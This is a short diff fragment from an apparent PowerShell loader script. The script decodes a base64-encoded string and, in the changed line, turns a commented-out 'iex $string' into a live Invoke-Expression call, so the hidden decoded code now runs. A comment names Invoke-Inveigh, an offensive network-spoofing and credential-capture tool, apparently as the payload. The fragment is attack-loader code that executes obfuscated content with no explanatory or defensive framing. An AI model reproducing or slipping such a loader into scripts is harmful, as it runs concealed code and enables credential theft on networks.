@@ -25,5 +25,5 @@ $byteCode = [System.Convert]::FromBase64String($base64Code)
 $string = [text.Encoding]::UTF8.GetString($byteCode)
 
 #Usage of tool:
-#iex $string
+iex $string
 #Invoke-Inveigh -ConsoleOutput Y -IP YOUR-IP
